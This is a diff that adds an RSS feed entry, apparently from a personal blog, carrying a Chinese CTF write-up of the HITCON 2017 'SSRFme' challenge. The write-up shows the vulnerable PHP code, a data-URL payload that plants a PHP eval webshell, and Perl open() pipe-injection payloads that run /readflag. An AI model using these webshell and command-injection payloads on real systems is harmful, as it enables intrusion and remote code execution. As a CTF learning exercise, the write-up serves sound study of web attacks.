@@ -1205,6 +1205,69 @@ while True:
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/06/02/2017-SSRFme/</guid>
+            <title>‘’[HITCON 2017]SSRFme‘’</title>
+            <link>http://odiws.github.io/2024/06/02/2017-SSRFme/</link>
+            <category>buuctf</category>
+            <pubDate>Sun, 02 Jun 2024 14:57:07 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;hitcon-2017ssrfme&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hitcon-2017ssrfme&#34;&gt;#&lt;/a&gt; [HITCON 2017]SSRFme&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;127.0.0.1&amp;lt;?php
+    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;
+        $http_x_headers = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
+        $_SERVER[&#39;REMOTE_ADDR&#39;] = $http_x_headers[0];
+    &amp;#125;
+
+    echo $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];
+
+    $sandbox = &amp;quot;sandbox/&amp;quot; . md5(&amp;quot;orange&amp;quot; . $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+
+    $data = shell_exec(&amp;quot;GET &amp;quot; . escapeshellarg($_GET[&amp;quot;url&amp;quot;]));
+    $info = pathinfo($_GET[&amp;quot;filename&amp;quot;]);
+    $dir  = str_replace(&amp;quot;.&amp;quot;, &amp;quot;&amp;quot;, basename($info[&amp;quot;dirname&amp;quot;]));
+    @mkdir($dir);
+    @chdir($dir);
+    @file_put_contents(basename($info[&amp;quot;basename&amp;quot;]), $data);
+    highlight_file(__FILE__);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;实现发送 GET 请求给当前 GET 参数’url‘，并将其结果保存在 /sandbox/md5 (“orange” . $_SERVER [“REMOTE_ADDR”])/filename 中，其中 filename 为传入的 Get 参数。&lt;/p&gt;
+&lt;p&gt;将 filename 存储在 /sandbox/md5 (“orange”+127.0.0.1)/filename 里面，url 是将读到的内容写入 filename 中&lt;/p&gt;
+&lt;p&gt;通过 /sandbox/md5 (“orange”+127.0.0.1)/filename 可以访问得到&lt;/p&gt;
+&lt;h3 id=&#34;2-路径泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-路径泄露&#34;&gt;#&lt;/a&gt; 2. 路径泄露&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;试试路径泄露，直接访问本机根目录：&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;c29008&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ea1f&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;cf4&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;89&lt;/span&gt;c9&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;cb955abca7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;node4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;81&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;upload&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时发现 flag，就在根目录中：&lt;/p&gt;
+&lt;p&gt;但是 GET 命令并不能读文件，此时想的是通过一个远程主机写好马，然后 get 完之后将马存储在 test.php 中，实现远程写马。但是因为没有公网 ip (还是穷)，而且推测 get 完远程主机返回的不一定是 php 代码而是 html，所以作罢，想想其他思路。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;这里存在一个 readflag，于是测试一下访问它：&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;http&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;59&lt;/span&gt;c29008&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;ea1f&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;cf4&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;89&lt;/span&gt;c9&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;cb955abca7&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;node4&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;buuoj&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cn&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;81&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;readflag&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;upload&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;test&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;感觉是读 flag 的脚本，那现在需要做的就是执行它。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-思路一ssrf配合伪协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-思路一ssrf配合伪协议&#34;&gt;#&lt;/a&gt; 3. 思路一：SSRF 配合伪协议&lt;/h3&gt;
+&lt;p&gt;联想到之前有个题目中是 file_put_contents 函数使用 data 伪协议控制其内容，这里想通过 GET 后加 data 伪协议实现写马，payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php-template&#34;&gt;?url=data:text/plain,&#39;&amp;lt;?php @eval($_POST[&#39;capt&#39;])?&amp;gt;&#39;&amp;amp;filename=upload/test.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;至于为什么需要引号，可以在 linux 中测试，如果不加引号，命令行会因为 &amp;lt;? 等符号解析错误。&lt;/p&gt;
+&lt;p&gt;此时因为写入的文件名称后缀可以是 php，所以直接访问沙河中的 php 文件，再使用蚁剑连接。但是直接打开根目录的 flag 显示为空。所以在蚁剑中打开命令行，运行 readflag：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BHITCON2017%5DSSRFme/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;4-思路二perl语言漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-思路二perl语言漏洞&#34;&gt;#&lt;/a&gt; 4. 思路二：perl 语言漏洞&lt;/h3&gt;
+&lt;p&gt;这也是大部分题解中的思路，利用 perl 语言的漏洞：&lt;/p&gt;
+&lt;p&gt;因为 GET 函数在底层调用了 perl 语言中的 open 函数，但是该函数存在 rce 漏洞。当 open 函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行。&lt;/p&gt;
+&lt;p&gt;先创建该文件：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token assign-left variable&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;/readflag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;再执行命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight makefile&#34;&gt;&lt;figcaption data-lang=&#34;makefile&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?url&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;file&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;readflag&amp;amp;filename&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;123&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;最后访问 123 文件即可。但是网上的 Payload 我都没成功。&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;对于 ssrf 首先还是想到伪协议&lt;/li&gt;
+&lt;li&gt;perl 语言的漏洞，管道符的利用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/CAPD/p/17858896.html&#34;&gt;(&lt;em&gt;´∇｀&lt;/em&gt;) 欢迎回来！ (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://odiws.github.io/2024/05/28/buuctf5%E6%9C%8828%E6%97%A5/</guid>
             <title>&#39;[GWCTF 2019]枯燥的抽奖&#39;</title>
             <link>http://odiws.github.io/2024/05/28/buuctf5%E6%9C%8828%E6%97%A5/</link>
